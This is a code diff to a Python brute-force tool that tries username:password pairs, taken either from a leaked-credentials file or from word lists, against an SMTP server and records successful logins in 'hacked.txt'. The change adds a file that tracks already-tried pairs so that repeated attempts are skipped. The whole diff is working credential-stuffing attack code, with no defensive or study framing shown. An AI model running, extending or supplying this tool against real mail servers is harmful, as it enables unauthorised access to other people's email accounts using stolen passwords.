@@ -3,6 +3,7 @@ import os
 from smtplib import SMTP
 
 DEFAULT_OUTPUT_FILE = 'hacked.txt'
+DEFAULT_USED_CREDENTIALS_FILE = 'used-credentials.txt'
 
 
 def get_arguments():
@@ -21,7 +22,7 @@ def get_arguments():
                         action='store_true',
                         required=False,
                         help='Pass this argument to bruteforce an SMTP service '
-                             'located on the specified --ip and --port.')
+                             'located on the specified --host and --port.')
     parser.add_argument('--user',
                         dest='user',
                         required=False,
@@ -67,6 +68,24 @@ def get_arguments():
     if not options.smtp:
         parser.error('You have to give a service name to bruteforce. Use --help for more info')
     return options
+
+
+def is_used_credentials(username, password,
+                        used_credentials_file=DEFAULT_USED_CREDENTIALS_FILE):
+    with open(used_credentials_file, 'r') as f:
+        for line in f.readlines():
+            creds = f'{username}:{password}'
+            if creds == line.strip():
+                print(f'{creds} has already been used')
+                return True
+
+
+def write_to_used_credentials_file(username, password,
+                                   used_credentials_file=DEFAULT_USED_CREDENTIALS_FILE):
+    with open(used_credentials_file, 'a') as f:
+        creds = f'{username}:{password}'
+        f.write(creds)
+        f.write(os.linesep)
 
 
 def do_smtp_login(smtp_host, smtp_port, username, password):
@@ -133,6 +152,8 @@ if leak_file_path:
         password = line.split(":")[1]
         if '@' in username:
             username = username.split('@')[0]
+        if is_used_credentials(username, password):
+            continue
 
         hacked = False
         if options.smtp:
@@ -140,6 +161,7 @@ if leak_file_path:
                                    smtp_port=port,
                                    username=username,
                                    password=password)
+            write_to_used_credentials_file(username, password)
         if hacked:
             creds = f"{username}:{password}"
             print(f'SUCCESS - {creds}')
@@ -150,12 +172,13 @@ if leak_file_path:
                 continue
             else:
                 exit()
-
 else:
     for username in usernames:
         for password in passwords:
             if '@' in username:
                 username = username.split('@')[0]
+            if is_used_credentials(username, password):
+                continue
 
             hacked = False
             if options.smtp:
@@ -163,6 +186,7 @@ else:
                                        smtp_port=port,
                                        username=username,
                                        password=password)
+                write_to_used_credentials_file(username, password)
             if hacked:
                 creds = f"{username}:{password}"
                 print(f'SUCCESS - {creds}')
@@ -173,4 +197,3 @@ else:
                     continue
                 else:
                     exit()
-
